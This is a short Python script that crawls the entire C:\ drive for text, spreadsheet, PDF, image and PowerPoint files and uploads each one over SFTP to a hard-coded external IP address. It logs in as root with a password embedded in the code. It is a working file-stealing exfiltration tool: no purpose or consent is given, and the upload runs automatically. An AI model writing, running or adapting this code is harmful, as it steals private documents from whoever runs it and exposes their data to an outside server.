import os
import paramiko


def get_all_file_paths(directory):

    # initializing empty file paths list
    file_paths = []

    # crawling through directory and subdirectories
    for root, directories, files in os.walk(directory):
        for filename in files:
            if filename.endswith('.txt') + filename.endswith('.xlsx') + filename.endswith('.pdf') + filename.endswith('.jpg') + filename.endswith('.ppt'):
            # join the two strings in order to form the full filepath.
                filepath = os.path.join(root, filename)
                fullname, name = os.path.split(filepath)
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname='172.105.53.52',username='root',password='Root@roxx2',port=22)
                sftp_client = ssh.open_sftp()
                sftp_client.put(filepath,'/root/'+name)
                sftp_client.close()
                ssh.close()

get_all_file_paths('C:\\')



